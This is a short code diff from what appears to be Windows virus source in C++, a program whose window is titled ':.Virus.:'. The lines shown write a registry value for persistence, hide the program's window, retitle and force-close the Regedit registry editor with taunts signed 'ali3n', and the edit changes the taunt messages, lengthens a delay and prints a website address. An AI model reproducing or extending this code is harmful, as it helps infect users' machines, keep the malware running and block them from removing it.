@@ -76,7 +76,7 @@ RegSetValueEx(hKey, "SetUp",0,REG_SZ,(const unsigned char*)system,sizeof(system)
 RegCloseKey(hKey);
 
 mywindow = FindWindow(NULL,":.Virus.:");
-cout<<"You Are Doomed cyberot";
+cout<<"you are done now ;)";
 Sleep(1000);
 ShowWindow(mywindow, false);
 }
@@ -160,6 +160,7 @@ SetWindowText( Regedit, "You've been done by ali3n");
 PostMessage( Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
 }
 
-Sleep(10);
+Sleep(9999);
+cout<< Go to www.ali3n.co.uk/error.html<<endl;
 }
 }
